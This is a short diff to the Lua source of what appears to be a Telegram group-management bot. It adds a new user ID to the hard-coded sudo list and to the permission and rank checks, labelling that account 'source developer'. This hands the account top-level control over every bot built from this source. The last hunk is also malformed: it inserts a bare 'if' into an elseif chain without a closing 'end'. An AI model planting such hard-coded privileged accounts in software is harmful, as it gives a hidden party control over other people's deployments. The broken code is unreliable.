@@ -170,7 +170,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1466244479,1033028167}   
+sudo_users = {SUDO,1466244479,1033028167,1264922434}   
 function SudoBot(msg)  
 local TELAND = false  
 for k,v in pairs(sudo_users) do  
@@ -255,6 +255,8 @@ function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1466244479) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1033028167) then
+var = true 
+elseif tonumber(user_id) == tonumber(1264922434) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -288,6 +290,8 @@ if tonumber(user_id) == tonumber(1466244479) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(1033028167) then
 var = 'Telegram Developer'
+if tonumber(user_id) == tonumber(1264922434) then  
+var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then 
